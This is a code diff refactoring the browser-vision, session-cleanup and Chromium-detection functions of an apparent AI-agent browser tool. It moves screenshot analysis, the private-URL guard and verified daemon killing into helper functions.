+        data_url = _resize_image_for_vision(screenshot_path, mime_type="image/png")
+        call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
+        response = _lazy_call_llm(**call_kwargs)
+
+    analysis = (response.choices[0].message.content or "").strip()
+    # Redact secrets the vision LLM may have read from the screenshot.
+    from agent.redact import redact_sensitive_text
+    return redact_sensitive_text(analysis)
+
+
+def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
+    """Screenshot the current page for visual inspection (CAPTCHAs, images, layouts).
+
+    Native-vision models get the screenshot attached to the conversation (a
+    multimodal tool-result envelope); otherwise the auxiliary vision model
+    returns a text analysis as JSON. Either way the file is saved persistently
+    and its path returned so it can be shared via MEDIA:<path>.
+    ``annotate`` overlays numbered [N] labels on interactive elements.
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
-    import base64
     import uuid as uuid_mod
     from hermes_constants import get_hermes_dir
     screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
@@ -5539,106 +3988,27 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     effective_task_id = _last_session_key(task_id or "default")
 
     # ── Private-network guard: block vision from eval-navigated private pages ──
-    # After any eval (browser_console) that may have changed location.href to a
-    # private/internal address, the screenshot would expose private page content
-    # to the vision model.  Re-check the current URL before capturing anything.
-    if (
-        not _is_local_backend()
-        and not _is_local_sidecar_key(effective_task_id)
-        and not _allow_private_urls()
-    ):
-        try:
-            _url_result = _run_browser_command(
-                effective_task_id, "eval", ["window.location.href"],
-                timeout=5, _engine_override="auto",
-            )
-            if _url_result.get("success"):
-                _current_url = (
-                    _url_result.get("data", {}).get("result", "")
-                    .strip().strip('"').strip("'")
-                )
-                if _current_url and not _is_safe_url(_current_url):
-                    return json.dumps({
-                        "success": False,
-                        "error": (
-                            "Blocked: page URL targets a private or internal address "
-                            f"({_current_url}). This may have been caused by a "
-                            "JavaScript navigation via browser_console."
-                        ),
-                    }, ensure_ascii=False)
-        except Exception as _url_exc:
-            logger.debug("browser_vision: URL safety check failed (%s)", _url_exc)
+    blocked = _blocked_private_page_content(effective_task_id)
+    if blocked is not None:
+        return blocked
 
-    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
-    # via the fallback helper instead of letting the normal path fail with a
-    # CDP error or return a placeholder PNG.  The normal analysis path below
-    # still owns base64 encoding, provider routing, resizing retry, redaction,
-    # and response shape.
-    engine = _get_browser_engine()
-    _lp_prerouted = False
-    _lp_fallback_warning = None
-    if engine == "lightpanda" and _should_inject_engine(engine):
-        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
-        screenshot_args = []
-        if annotate:
-            screenshot_args.append("--annotate")
-        fb_result = _chrome_fallback_screenshot(
-            effective_task_id, screenshot_args, _get_command_timeout(),
-        )
-        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
-        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
-        if fb_result.get("success"):
-            _lp_prerouted = True
-            _lp_fallback_warning = fb_result.get("fallback_warning")
-            fb_path = fb_result.get("data", {}).get("path", "")
-            if fb_path and os.path.exists(fb_path):
-                from hermes_constants import get_hermes_dir
-                screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
-                screenshots_dir.mkdir(parents=True, exist_ok=True)
-                import shutil as _shutil_vision
-                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
-                _shutil_vision.copy2(fb_path, persistent_path)
-                screenshot_path = persistent_path
-        else:
-            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
-            # Fall through to the normal screenshot path so _run_browser_command
-            # can still produce the standard fallback metadata/error.
-            _lp_prerouted = False
+    _lp_prerouted, _lp_fallback_warning, screenshot_path = _lightpanda_vision_preroute(
+        effective_task_id, annotate, screenshot_path,
+    )
 
     try:
         screenshots_dir.mkdir(parents=True, exist_ok=True)
-
         # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
         _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)
 
         if _lp_prerouted and screenshot_path.exists():
-            result = {
-                "success": True,
-                "data": {
-                    "path": str(screenshot_path),
-                    "fallback_warning": _lp_fallback_warning,
-                    "browser_engine": "chrome",
-                    "browser_engine_fallback": {
-                        "from": "lightpanda",
-                        "to": "chrome",
-                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
-                    },
-                },
-                "fallback_warning": _lp_fallback_warning,
-                "browser_engine": "chrome",
-                "browser_engine_fallback": {
-                    "from": "lightpanda",
-                    "to": "chrome",
-                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
-                },
-            }
+            result = _annotate_lightpanda_fallback(
+                {"success": True, "data": {"path": str(screenshot_path)}},
+                _LP_VISION_FALLBACK_REASON,
+            )
         else:
-            # Take screenshot using agent-browser
-            screenshot_args = []
-            if annotate:
-                screenshot_args.append("--annotate")
-            screenshot_args.append("--full")
-            screenshot_args.append(str(screenshot_path))
+            screenshot_args = ["--annotate"] if annotate else []
+            screenshot_args += ["--full", str(screenshot_path)]
             result = _run_browser_command(
                 effective_task_id,
                 "screenshot",
@@ -5650,11 +4020,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
         if not result.get("success"):
             error_detail = result.get("error", "Unknown error")
-            _cp = _get_cloud_provider()
-            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
             error_response = {
                 "success": False,
-                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
+                "error": f"Failed to take screenshot ({_vision_mode_label()} mode): {error_detail}"
             }
             return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)
 
@@ -5662,171 +4030,40 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         if actual_screenshot_path:
             screenshot_path = Path(actual_screenshot_path)
 
-        # Check if screenshot file was created
         if not screenshot_path.exists():
-            _cp = _get_cloud_provider()
-            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
             return json.dumps({
                 "success": False,
                 "error": (
-                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
+                    f"Screenshot file was not created at {screenshot_path} ({_vision_mode_label()} mode). "
                     f"This may indicate a socket path issue (macOS /var/folders/), "
                     f"a missing Chromium install ('agent-browser install'), "
                     f"or a stale daemon process."
                 ),
             }, ensure_ascii=False)
 
-        # NOTE: the full-resolution base64 encode is deliberately deferred.
-        # The native fast path below sizes its own history-reuse embed via
-        # _resize_image_for_vision (stat-based quick estimate — no full-res
-        # encode when oversized), and only the aux-LLM fallback path needs
-        # the one-shot full-res data URL.
-
-        # Fast path: when native image routing is in effect for the active main
-        # model, attach the screenshot directly instead of describing it through
-        # an auxiliary vision LLM. The model inspects the pixels on its next
-        # turn — no aux call, no information loss. Consistent with vision_analyze.
-        from tools.vision_tools import (
-            _EMBED_MAX_DIMENSION,
-            _EMBED_TARGET_BYTES,
-            _build_native_vision_tool_result,
-            _resize_image_for_vision,
-            _should_use_native_vision_fast_path,
-        )
+        # Fast path: native image routing for the active main model — attach the
+        # screenshot directly instead of describing it through an aux vision LLM
+        # (no aux call, no information loss; consistent with vision_analyze).
+        from tools.vision_tools import _should_use_native_vision_fast_path
 
         if _should_use_native_vision_fast_path():
-            # History-reuse cap (#92699): this embed is baked into the tool
-            # result and re-sent on every later turn, exactly like
-            # vision_analyze's native path — apply the same proactive resize
-            # so full-res screenshots can't enter immutable history uncapped.
-            # The helper's internal stat/dimension quick-estimate skips the
-            # resize (and encodes directly) when the screenshot is already
-            # under both caps, so no full-res base64 is built just to be
-            # thrown away. Fail-open: without Pillow it falls back to the
-            # raw bytes and the compressor's keep-newest pass still retires
-            # stale embeds.
-            data_url = _resize_image_for_vision(
-                screenshot_path,
-                mime_type="image/png",
-                max_base64_bytes=_EMBED_TARGET_BYTES,
-                max_dimension=_EMBED_MAX_DIMENSION,
-                force_jpeg=True,
-            )
-            native_result = _build_native_vision_tool_result(
-                image_url=str(screenshot_path),
-                question=question,
-                image_data_url=data_url,
-                image_size_bytes=screenshot_path.stat().st_size,
-            )
-            meta = native_result.setdefault("meta", {})
-            meta["screenshot_path"] = str(screenshot_path)
-            if _lp_fallback_warning:
-                meta["fallback_warning"] = _lp_fallback_warning
-            if annotate and result.get("data", {}).get("annotations"):
-                meta["annotations"] = result["data"]["annotations"]
-            native_result["text_summary"] = (
-                f"{native_result.get('text_summary', '')} "
-                f"Screenshot path: {screenshot_path}"
-            ).strip()
-            return native_result
+            return _native_vision_result(screenshot_path, question, annotate, result, _lp_fallback_warning)
 
-        vision_prompt = (
-            f"You are analyzing a screenshot of a web browser.\n\n"
-            f"User's question: {question}\n\n"
-            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
-            f"If there are interactive elements, describe them. If there are verification challenges "
-            f"or CAPTCHAs, describe what type they are and what action might be needed. "
-            f"Focus on answering the user's specific question."
-        )
-
-        # Aux-LLM path: one-shot analysis, not baked into history — encode at
-        # full resolution here (the pre-existing 5 MB oversize guard below
-        # still applies).
-        _screenshot_bytes = screenshot_path.read_bytes()
-        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
-        data_url = f"data:image/png;base64,{_screenshot_b64}"
-
-        # Use the centralized LLM router
-        vision_model = _get_vision_model()
-        logger.debug("browser_vision: analysing screenshot (%d bytes)",
-                     len(_screenshot_bytes))
-
-        # Read vision timeout/temperature from config (auxiliary.vision.*).
-        # Local vision models (llama.cpp, ollama) can take well over 30s for
-        # screenshot analysis, so the default timeout must be generous.
-        vision_timeout = 120.0
-        vision_temperature = 0.1
-        try:
-            from hermes_cli.config import load_config
-            _cfg = load_config()
-            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
-            _vt = _vision_cfg.get("timeout")
-            if _vt is not None:
-                vision_timeout = float(_vt)
-            _vtemp = _vision_cfg.get("temperature")
-            if _vtemp is not None:
-                vision_temperature = float(_vtemp)
-        except Exception:
-            pass
-
-        call_kwargs = {
-            "task": "vision",
-            "messages": [
-                {
-                    "role": "user",
-                    "content": [
-                        {"type": "text", "text": vision_prompt},
-                        {"type": "image_url", "image_url": {"url": data_url}},
-                    ],
-                }
-            ],
-            "temperature": vision_temperature,
-            "timeout": vision_timeout,
-        }
-        if vision_model:
-            call_kwargs["model"] = vision_model
-        # Try full-size screenshot; on size-related rejection, downscale and retry.
-        try:
-            response = _lazy_call_llm(**call_kwargs)
-        except Exception as _api_err:
-            from tools.vision_tools import (
-                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
-            )
-            if (_is_image_size_error(_api_err)
-                    and len(data_url) > _RESIZE_TARGET_BYTES):
-                logger.info(
-                    "Vision API rejected screenshot (%.1f MB); "
-                    "auto-resizing to ~%.0f MB and retrying...",
-                    len(data_url) / (1024 * 1024),
-                    _RESIZE_TARGET_BYTES / (1024 * 1024),
-                )
-                data_url = _resize_image_for_vision(
-                    screenshot_path, mime_type="image/png")
-                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
-                response = _lazy_call_llm(**call_kwargs)
-            else:
-                raise
-
-        analysis = (response.choices[0].message.content or "").strip()
-        # Redact secrets the vision LLM may have read from the screenshot.
-        from agent.redact import redact_sensitive_text
-        analysis = redact_sensitive_text(analysis)
+        analysis = _analyze_screenshot_with_aux_llm(screenshot_path, question)
         response_data = {
             "success": True,
             "analysis": analysis or "Vision analysis returned no content.",
             "screenshot_path": str(screenshot_path),
         }
         _copy_fallback_warning(response_data, result)
-        # Include annotation data if annotated screenshot was taken
         if annotate and result.get("data", {}).get("annotations"):
             response_data["annotations"] = result["data"]["annotations"]
         return json.dumps(response_data, ensure_ascii=False)
 
     except Exception as e:
-        # Keep the screenshot if it was captured successfully — the failure is
-        # in the LLM vision analysis, not the capture.  Deleting a valid
-        # screenshot loses evidence the user might need.  The 24-hour cleanup
-        # in _cleanup_old_screenshots prevents unbounded disk growth.
+        # Keep the screenshot if it was captured — the failure is in the vision
+        # analysis, not the capture, and deleting it loses evidence the user may
+        # need. The 24-hour cleanup bounds disk growth.
         logger.warning("browser_vision failed: %s", e, exc_info=True)
         error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
         if screenshot_path.exists():
@@ -5882,70 +4119,94 @@ def _cleanup_old_recordings(max_age_hours=72):
 # Cleanup and Management Functions
 # ============================================================================
 
-def cleanup_browser(task_id: Optional[str] = None) -> None:
+def _drop_last_active_binding(task_id: str) -> None:
+    """Drop stale last-active ownership after cleaning ``task_id``.
+
+    Cleaning a bare task drops its binding; cleaning a sidecar drops the binding
+    only if that sidecar was still the recorded owner — so a later
+    click/snapshot can't resurrect a cleaned sidecar on about:blank while a
+    primary-session binding is preserved.
     """
-    Clean up browser session(s) for a task.
+    if _is_local_sidecar_key(task_id):
+        bare_task_id = _bare_task_id_for_session_key(task_id)
+        if _last_active_session_key.get(bare_task_id) == task_id:
+            _last_active_session_key.pop(bare_task_id, None)
+    else:
+        _last_active_session_key.pop(task_id, None)
 
-    Called automatically when a task completes or when inactivity timeout is reached.
-    Closes both the agent-browser/Browserbase session and Camofox sessions.
 
-    When ``task_id`` is a bare task identifier (no ``::local`` suffix), reaps
-    BOTH the cloud/primary session AND any hybrid-routing local sidecar that
-    may have been spawned for LAN/localhost URLs in the same task.  When
-    ``task_id`` already carries a ``::local`` suffix (called from the inactivity
-    cleanup loop against a specific session key), reaps only that one.
+def cleanup_browser(task_id: Optional[str] = None) -> None:
+    """Clean up browser session(s) for a task (task completion / inactivity timeout).
 
-    Args:
-        task_id: Task identifier (or explicit session key)
+    A bare task id reaps BOTH the primary session and any hybrid local sidecar
+    spawned for it; a key already carrying ``::local`` (inactivity loop) reaps
+    only that one.
     """
     if task_id is None:
         task_id = "default"
 
-    # Expand to the full set of session keys to reap. For a bare task_id
-    # that includes the cloud/primary key + the local sidecar if one exists.
-    if _is_local_sidecar_key(task_id):
-        session_keys = [task_id]
-        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
-    else:
-        session_keys = [task_id]
+    session_keys = [task_id]
+    if not _is_local_sidecar_key(task_id):
         sidecar_key = f"{task_id}{_LOCAL_SUFFIX}"
         with _cleanup_lock:
             if sidecar_key in _active_sessions:
                 session_keys.append(sidecar_key)
-        bare_task_id = task_id
 
     for session_key in session_keys:
         _cleanup_single_browser_session(session_key)
+    _drop_last_active_binding(task_id)
 
-    # Drop stale last-active ownership. Cleaning a bare task drops its binding;
-    # cleaning a sidecar drops the binding only if that sidecar was still the
-    # recorded owner. This prevents a later click/snapshot from resurrecting a
-    # cleaned sidecar on about:blank while preserving a primary-session binding.
-    if _is_local_sidecar_key(task_id):
-        if _last_active_session_key.get(bare_task_id) == task_id:
-            _last_active_session_key.pop(bare_task_id, None)
-    else:
-        _last_active_session_key.pop(bare_task_id, None)
+
+def _kill_verified_daemon(socket_dir: str, session_name: str) -> bool:
+    """Tree-kill the daemon recorded in ``<socket_dir>/<session>.pid`` if it is verifiably ours.
+
+    The .pid file lives in a world-writable temp dir and PIDs recycle: the
+    process must pass ``_verify_reapable_browser_daemon`` and have a start-time
+    fingerprint (so the kill refuses if the PID is swapped between check and
+    kill). Returns True when a kill was issued. Never raises.
+    """
+    pid_file = os.path.join(socket_dir, f"{session_name}.pid")
+    if not os.path.isfile(pid_file):
+        return False
+    try:
+        from tools.process_registry import ProcessRegistry
+        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
+        if not _verify_reapable_browser_daemon(daemon_pid, socket_dir, session_name):
+            logger.debug(
+                "Skipped daemon kill for %s: pid %s failed identity "
+                "verification", session_name, daemon_pid)
+            return False
+        from gateway.status import get_process_start_time
+        daemon_start = get_process_start_time(daemon_pid)
+        if daemon_start is None:
+            logger.debug(
+                "Skipped daemon kill for %s: no start-time "
+                "fingerprint for pid %s", session_name, daemon_pid)
+            return False
+        ProcessRegistry._terminate_host_pid(daemon_pid, daemon_start)
+        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
+        return True
+    except (ProcessLookupError, ValueError, PermissionError, OSError):
+        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
+        return False
 
 
 def _release_session_resources(task_id: str, session_info: Dict[str, Any]) -> None:
     """Untrack ``task_id``, close its cloud provider session, kill its daemon.
 
     The unconditional tail of ``_cleanup_single_browser_session``; also the
-    whole of the janitor's force-reap path (#100738), which skips the polite
+    whole of the janitor's force-reap path, which skips the polite
     agent-browser/Camofox ``close`` that kept failing but must still release
     the cloud session and the local Chromium.
     """
     bb_session_id = session_info.get("bb_session_id", "unknown")
-    # Now remove from tracking under lock
     with _cleanup_lock:
         _active_sessions.pop(task_id, None)
         _session_last_activity.pop(task_id, None)
         _session_owner_homes.pop(task_id, None)
         _cleanup_failures.pop(task_id, None)
 
-    # Cloud mode: close the cloud browser session via provider API.
-    # Local sidecars have bb_session_id=None so this no-ops for them.
+    # Cloud mode only — local sidecars have bb_session_id=None.
     if bb_session_id:
         provider = _get_cloud_provider()
         if provider is not None:
@@ -5954,45 +4215,16 @@ def _release_session_resources(task_id: str, session_info: Dict[str, Any]) -> No
             except Exception as e:
                 logger.warning("Could not close cloud browser session: %s", e)
 
-    # Kill the daemon process and clean up socket directory
     session_name = session_info.get("session_name", "")
     if session_name:
         socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
         if os.path.exists(socket_dir):
-            # agent-browser writes {session}.pid in the socket dir
-            pid_file = os.path.join(socket_dir, f"{session_name}.pid")
-            if os.path.isfile(pid_file):
-                try:
-                    from tools.process_registry import ProcessRegistry
-                    daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
-                    # The .pid file lives in a world-writable temp dir and
-                    # PIDs recycle: verify this really is our daemon for
-                    # this session before tree-killing, and pin the
-                    # identity with a start-time fingerprint so the kill
-                    # refuses if the PID is swapped between check and kill.
-                    if _verify_reapable_browser_daemon(
-                            daemon_pid, socket_dir, session_name):
-                        from gateway.status import get_process_start_time
-                        daemon_start = get_process_start_time(daemon_pid)
-                        if daemon_start is not None:
-                            ProcessRegistry._terminate_host_pid(
-                                daemon_pid, daemon_start)
-                            logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
-                        else:
-                            logger.debug(
-                                "Skipped daemon kill for %s: no start-time "
-                                "fingerprint for pid %s", session_name, daemon_pid)
-                    else:
-                        logger.debug(
-                            "Skipped daemon kill for %s: pid %s failed identity "
-                            "verification", session_name, daemon_pid)
-                except (ProcessLookupError, ValueError, PermissionError, OSError):
-                    logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
+            _kill_verified_daemon(socket_dir, session_name)
             shutil.rmtree(socket_dir, ignore_errors=True)
 
 
 def _force_reap_browser_session(task_id: str) -> None:
-    """Janitor last resort after repeated cleanup failures (#100738).
+    """Janitor last resort after repeated cleanup failures.
 
     Skips the ``close`` round-trips that keep failing and goes straight to
     ``_release_session_resources`` (cloud close + daemon kill + untrack).
@@ -6004,13 +4236,7 @@ def _force_reap_browser_session(task_id: str) -> None:
         _recording_sessions.discard(task_id)
     if session_info:
         _release_session_resources(task_id, session_info)
-    # Same ownership-binding drop as cleanup_browser().
-    if _is_local_sidecar_key(task_id):
-        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
-        if _last_active_session_key.get(bare_task_id) == task_id:
-            _last_active_session_key.pop(bare_task_id, None)
-    else:
-        _last_active_session_key.pop(task_id, None)
+    _drop_last_active_binding(task_id)
 
 
 def _cleanup_single_browser_session(task_id: str) -> None:
@@ -6108,7 +4334,7 @@ def cleanup_all_browsers() -> None:
     _agent_browser_resolved = False
     _discover_homebrew_node_dirs.cache_clear()
     # Flip the resolved flag BEFORE nulling the cache so a concurrent
-    # reader never sees ``resolved=True`` with ``cache=None`` (#14331).
+    # reader never sees ``resolved=True`` with ``cache=None``.
     _command_timeout_resolved = False
     _cached_command_timeout = None
     _snapshot_threshold_resolved = False
@@ -6129,17 +4355,9 @@ _cached_chromium_installed: Optional[bool] = None
 
 
 def _chromium_search_roots() -> List[str]:
-    """Directories to scan for a Chromium / headless-shell build.
-
-    Order mirrors what agent-browser and Playwright actually probe:
-
-    1. ``PLAYWRIGHT_BROWSERS_PATH`` when set (Docker image sets this to
-       ``/opt/hermes/.playwright``).
-    2. ``~/.cache/ms-playwright`` — Playwright's default on Linux/macOS.
-    3. ``~/Library/Caches/ms-playwright`` — Playwright's default on macOS.
-    4. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` — Playwright's default
-       on Windows.
-    """
+    """Directories to scan for a Chromium / headless-shell build, in the order
+    agent-browser and Playwright probe them: ``PLAYWRIGHT_BROWSERS_PATH``, then
+    Playwright's per-OS default cache."""
     roots: List[str] = []
     env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
     if env_path and env_path != "0":
@@ -6159,21 +4377,10 @@ def _chromium_search_roots() -> List[str]:
 def _chromium_installed() -> bool:
     """Return True when a usable Chromium (or headless-shell) build is on disk.
 
-    Checks, in order:
-
-    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` env var — the official way to point
-       agent-browser at a pre-installed Chrome/Chromium.
-    2. System Chrome/Chromium in PATH (``google-chrome``, ``chromium``,
-       ``chromium-browser``, ``chrome``).
-    3. Playwright's browser cache (current logic) — directories containing
-       ``chromium-*`` or ``chromium_headless_shell-*``.
-
-    agent-browser (0.26+) downloads Playwright's chromium / headless-shell
-    builds into ``PLAYWRIGHT_BROWSERS_PATH`` and won't start without at least
-    one of the three above being present.  Without a browser binary the CLI
-    hangs on first use until the command timeout fires (often ~30s).  Guarding
-    the tool behind this check prevents advertising a capability that will
-    fail at runtime.
+    Checks ``AGENT_BROWSER_EXECUTABLE_PATH``, then system Chrome/Chromium on
+    PATH, then Playwright's cache (``chromium-*`` / ``chromium_headless_shell-*``
+    dirs). Without a binary the CLI hangs on first use until the command
+    timeout fires, so the tool must not be advertised.
     """
     global _cached_chromium_installed
     if _cached_chromium_installed is not None:
@@ -6181,10 +4388,9 @@ def _chromium_installed() -> bool:
 
     # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
     ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
-    if ab_path:
-        if os.path.isfile(ab_path) or shutil.which(ab_path):
-            _cached_chromium_installed = True
-            return True
+    if ab_path and (os.path.isfile(ab_path) or shutil.which(ab_path)):
+        _cached_chromium_installed = True
+        return True
 
     # 2. System Chrome/Chromium in PATH (common names)
     system_chrome = (
@@ -6226,18 +4432,11 @@ _chromium_autoinstall_attempted = False
 def _maybe_autoinstall_chromium() -> bool:
     """Best-effort, gated download of the Chromium *binary* on local cold start.
 
-    Closes the "the PR doesn't actually install the missing browser" gap for
-    the common case — a Chromium binary that was simply never downloaded.
-    Scope is deliberately narrow:
-
-    - Binary only (``agent-browser install``), never ``--with-deps`` — that
-      shells ``apt`` and needs root, so missing *system libraries* stay a user
-      action (the timeout/blocked hints already point there).
-    - Gated by ``security.allow_lazy_installs`` (same opt-out as every other
-      lazy install) and skipped in Docker, where Chromium ships in the image.
-    - Attempted once per process.
-
-    Returns True only when Chromium is present afterwards.
+    Binary only (``agent-browser install``), never ``--with-deps`` — that shells
+    ``apt`` and needs root, so missing system libraries stay a user action.
+    Gated by ``security.allow_lazy_installs``, skipped in Docker (Chromium ships
+    in the image), attempted once per process. True only when Chromium is
+    present afterwards.
     """
     global _chromium_autoinstall_attempted
     if _chromium_autoinstall_attempted:
@@ -6303,20 +4502,11 @@ def _running_in_docker() -> bool:
 
 
 def check_browser_requirements() -> bool:
-    """
-    Check if browser tool requirements are met.
+    """Whether the browser tools should be advertised.
 
-    In **local mode** (no cloud provider configured): the ``agent-browser``
-    CLI must be findable. Chrome/Chromium is required for the default Chrome
-    engine and for fallback/screenshot paths, but not for Lightpanda-only text
-    navigation/snapshot workflows.
-
-    In **cloud mode** (Browserbase, Browser Use, or Firecrawl): the CLI
-    and the provider's required credentials must be present. The cloud
-    provider hosts its own Chromium, so no local browser binary is needed.
-
-    Returns:
-        True if all requirements are met, False otherwise
+    Local mode needs the ``agent-browser`` CLI plus a Chromium build (except
+    Lightpanda-only text workflows); cloud mode needs the CLI plus provider
+    credentials (the provider hosts its own Chromium).
     """
     # Browser Use CLI backend — browser_exec replaces the whole browser_*
     # surface (including browser_cdp/browser_dialog, whose check_fns funnel
@@ -6366,21 +4556,12 @@ def check_browser_requirements() -> bool:
 
     # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
     # it the CLI hangs on first use until the command timeout fires.
-    if not _chromium_installed():
-        return False
-
-    return True
+    return _chromium_installed()
 
 
 def check_browser_vision_requirements() -> bool:
-    """Whether ``browser_vision`` should be advertised to the model.
-
-    Requires BOTH a working browser (``check_browser_requirements``) AND a
-    resolvable vision backend. Without the vision check, the tool stays in
-    the model's tool list even when no vision provider is configured, then
-    fails at call time with a cryptic provider-side error like
-    ``unknown variant `image_url`, expected `text``` (issue #31179).
-    """
+    """Advertise ``browser_vision`` only with BOTH a working browser AND a vision
+    backend — otherwise it fails at call time with a cryptic provider error."""
     if not check_browser_requirements():
         return False
     try:
